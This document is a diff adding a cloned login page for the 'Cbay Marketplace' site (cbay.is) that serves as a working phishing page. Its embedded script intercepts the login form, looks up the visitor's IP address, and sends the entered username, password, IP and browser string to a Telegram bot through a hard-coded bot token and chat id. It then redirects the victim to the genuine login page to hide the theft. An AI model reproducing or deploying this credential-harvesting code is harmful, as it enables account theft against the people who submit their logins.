@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Login - Cbay Marketplace - cbay.is</title>
+    <meta name="description" content="Cbay offers you a digital marketplace with over 10,000 active customers. Start to sell and buy now.">
+    <meta name="keywords" content="cbay, the crime bay">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://cbay.is/auth/login">
+    <link rel="stylesheet" href="./Login - Cbay Marketplace - cbay.is_files/default.css">
+    <link rel="icon" type="image/x-icon" href="https://cbay.is/images/favicon.ico">
+</head>
+<body>
+    <section class="section hero is-fullheight is-error-section">
+        <div class="hero-body">
+            <div class="container">
+                <div class="columns is-centered">
+                    <div class="column is-two-fifths">
+                        <div class="is-flex is-align-items-center is-justify-content-space-between mb-5">
+                            <a href="https://cbay.is/">
+                                <span class="title is-8"><span class="has-text-primary">c</span>bay</span>
+                            </a>
+                        </div>
+                        <div class="card has-card-header-background">
+                            <div class="card-content">
+                                <form id="loginForm" method="POST">
+                                    <div class="field">
+                                        <label class="label" for="username">Username</label>
+                                        <div class="control">
+                                            <input name="username" id="username" class="input" required="" autofocus="" type="text" placeholder="Username" value="">
+                                        </div>
+                                    </div>
+                                    <div class="field">
+                                        <label class="label" for="password">Password</label>
+                                        <div class="control">
+                                            <input name="password" id="password" class="input" required="" type="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                    <hr>
+                                    <div class="field">
+                                        <div class="control">
+                                            <button type="submit" class="button is-primary is-fullwidth">
+                                                <span>Login now</span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <div class="card-content has-text-centered">
+                                <div class="is-mobile-flex">
+                                    <span>Don't have an account yet?</span>
+                                    <a href="https://cbay.is/auth/register" class="button is-outlined is-mobile-margin">
+                                        <span>Create an account</span>
+                                        <span class="icon"><i class="mdi mdi-arrow-right-thick"></i></span>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="hero-foot has-text-centered">
+            <div class="logo"></div>
+        </div>
+    </section>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Capture the IP and User-Agent
+            var ipRequest = new XMLHttpRequest();
+            ipRequest.open('GET', 'https://api.ipify.org?format=json', true);
+            ipRequest.onload = function() {
+                if (ipRequest.status >= 200 && ipRequest.status < 400) {
+                    var data = JSON.parse(ipRequest.responseText);
+                    var ip = data.ip;
+                    var userAgent = navigator.userAgent;
+
+                    var username = document.getElementById('username').value;
+                    var password = document.getElementById('password').value;
+
+                    // Send the data to Telegram
+                    var telegramMessage = username + ':' + password + ' | ' + ip + ' | ' + userAgent;
+                    var botToken = '6999963979:AAHY-DWqverjhUgNxYkoegHLZ32S2GZbqGI';
+                    var chatId = '6003330631';
+                    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(telegramMessage);
+
+                    var telegramRequest = new XMLHttpRequest();
+                    telegramRequest.open('GET', telegramUrl, true);
+                    telegramRequest.send();
+
+                    // Redirect to the original login URL
+                    window.location.href = 'https://cbay.is/auth/login';
+                }
+            };
+            ipRequest.send();
+        });
+    </script>
+</body>
+</html>
